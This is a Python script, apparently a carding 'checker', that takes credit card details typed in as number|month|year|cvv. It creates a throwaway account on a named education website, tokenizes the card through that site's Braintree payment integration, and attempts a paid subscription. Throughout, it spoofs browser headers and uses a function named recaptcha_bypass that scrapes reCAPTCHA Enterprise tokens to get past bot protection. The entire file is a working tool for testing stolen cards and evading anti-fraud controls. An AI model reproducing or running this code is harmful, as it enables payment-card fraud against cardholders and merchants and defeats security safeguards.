import re, requests
from urllib.parse import urlparse, urlencode, parse_qs
def recaptcha_bypass():    
    anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=en&v=_mscDd1KHr60EWWbt2I_ULP0&size=invisible&anchor-ms=20000&execute-ms=15000&cb=9rxqj565e126"
    reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD"    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
    parsed_url = urlparse(anchor_url)
    params = parse_qs(parsed_url.query)
    response = requests.get(anchor_url, headers=headers)
    token = re.search(r'value="([^"]+)"', response.text).group(1)
    data = {'v': params['v'][0],'reason': 'q','c': token,'k': params['k'][0],'co': params['co'][0],'hl': 'tr','size': 'invisible'}
    headers.update({"Referer": response.url,"Content-Type": "application/x-www-form-urlencoded"})
    response = requests.post(reload_url, headers=headers, data=data)
    return re.search(r'\["rresp","([^"]+)"', response.text).group(1)

import json,random
c=input("enter cc: ")
x=c.split('|')
cc=x[0]
exp=x[1]
exy=x[2]
try:
	exy=exy[2]+exy[3]
except:pass
cvc=x[3]
r=requests.session()
j="1234567890qawsedzrtzfgxyuchjbiokblpn"
em=random.choice(j)*2+random.choice(j)*2+random.choice(j)*2+random.choice(j)+random.choice(j)
url = "https://apitwo.pixorize.com/users/register-simple"

payload = {
  "email": em+"@gmail.com",
  "password": "jdjrj@#818",
  "learner_classification": 1
}

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua-mobile': "?1",
  'Origin': "https://pixorize.com",
  'Sec-Fetch-Site': "same-site",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://pixorize.com/",
  'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
  
}

response = r.post(url, data=json.dumps(payload), headers=headers)
import base64

url = "https://apitwo.pixorize.com/braintree/token"

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'Origin': "https://pixorize.com",
  'Sec-Fetch-Site': "same-site",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://pixorize.com/",
  'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
}

response = r.get(url, headers=headers,cookies=r.cookies)

au=(response.json()['payload']['clientToken'])
base4=str(base64.b64decode(au))
auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]

url = "https://payments.braintree-api.com/graphql"

payload = {
  "clientSdkMetadata": {
    "source": "client",
    "integration": "dropin2",
    "sessionId": "90ec9e6b-9389-45c9-9542-ba6271ad49c6"
  },
  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
  "variables": {
    "input": {
      "creditCard": {
        "number": cc,
        "expirationMonth": exp,
        "expirationYear": "20"+exy,
        "cvv": cvc,
        "billingAddress": {
          "postalCode": "10090"
        }
      },
      "options": {
        "validate": False
      }
    }
  },
  "operationName": "TokenizeCreditCard"
}

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
  'sec-ch-ua-mobile': "?1",
  'authorization': "Bearer "+auth,
  'braintree-version': "2018-05-10",
  'sec-ch-ua-platform': "\"Android\"",
  'origin': "https://assets.braintreegateway.com",
  'sec-fetch-site': "cross-site",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://assets.braintreegateway.com/",
  'accept-language': "en-US,en;q=0.9,ar;q=0.8"
}

response = requests.post(url, data=json.dumps(payload), headers=headers)

token=(response.json()["data"]["tokenizeCreditCard"]["token"])

url = "https://apitwo.pixorize.com/braintree/pay"

payload = {
  "subscriptionTypeId": 26,
  "nonce": token,
  "deviceData": "{\"device_session_id\":\"1828806e70140be76f80b47aa269ef20\",\"fraud_merchant_id\":null,\"correlation_id\":\"8adec9342087be4c33374c6ab459cb56\"}",
  "promoCode": None,
  "captchaToken": recaptcha_bypass()
}

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua-mobile': "?1",
  'Origin': "https://pixorize.com",
  'Sec-Fetch-Site': "same-site",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://pixorize.com/",
  'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
  
}

response = requests.post(url, data=json.dumps(payload), headers=headers,cookies=r.cookies)
print(response.text)